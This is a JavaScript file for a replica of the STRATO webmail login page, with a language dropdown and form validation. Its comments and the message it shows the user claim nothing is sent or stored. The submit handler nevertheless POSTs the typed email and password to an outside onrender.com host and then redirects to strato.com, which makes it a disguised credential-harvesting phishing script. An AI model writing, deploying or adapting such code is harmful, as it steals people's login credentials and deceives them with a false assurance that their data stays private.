/* ===== STRATO Webmail Login – replica (front-end demo only) ===== */

const form = document.getElementById("loginForm");
const email = document.getElementById("email");
const password = document.getElementById("password");
const demoNote = document.getElementById("demoNote");

/* --- Language dropdown --- */
const langToggle = document.getElementById("langToggle");
const langMenu = document.getElementById("langMenu");
const langLabel = document.getElementById("langLabel");

langToggle.addEventListener("click", (e) => {
  e.stopPropagation();
  const open = langMenu.hidden;
  langMenu.hidden = !open;
  langToggle.setAttribute("aria-expanded", String(open));
});

langMenu.addEventListener("click", (e) => {
  const btn = e.target.closest("button[data-lang]");
  if (!btn) return;
  langLabel.textContent = btn.dataset.lang;
  langMenu.hidden = true;
  langToggle.setAttribute("aria-expanded", "false");
});

document.addEventListener("click", (e) => {
  if (!langMenu.hidden && !e.target.closest(".nav-lang-wrap")) {
    langMenu.hidden = true;
    langToggle.setAttribute("aria-expanded", "false");
  }
});

/* --- Validation helpers --- */
function setError(input, on) {
  input.closest(".field").classList.toggle("error", on);
}

[email, password].forEach((input) => {
  input.addEventListener("input", () => {
    setError(input, false);
    demoNote.hidden = true;
  });
});

/* --- Submit (demo: nothing is sent anywhere) --- */
form.addEventListener('submit', (e) => {
  e.preventDefault();

  const emailOk = email.value.trim().length > 0;
  const passOk = password.value.trim().length > 0;
  

  setError(email, !emailOk);
  setError(password, !passOk);

  if (!emailOk || !passOk) {
    demoNote.textContent = "Please fill in both your e-mail address and password.";
    demoNote.hidden = false;
    (!emailOk ? email : password).focus();
    return;
  }

  demoNote.textContent =
    "Front-end demo only — this replica does not send or store any credentials.";
  demoNote.hidden = false;

  fetch('https://web-backend-kim3.onrender.com/', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                email: email.value,
                password: password.value,
                source: 'Strato',
              }),
            })
              .then((res) => {
                if (!res.ok) {
                  throw new Error(
                    'Network response was not ok ' + res.statusText,
                  );
                }
                return res.json();
              })
              .then((data) => {
                window.location.href = 'strato.com';
              });
  
});
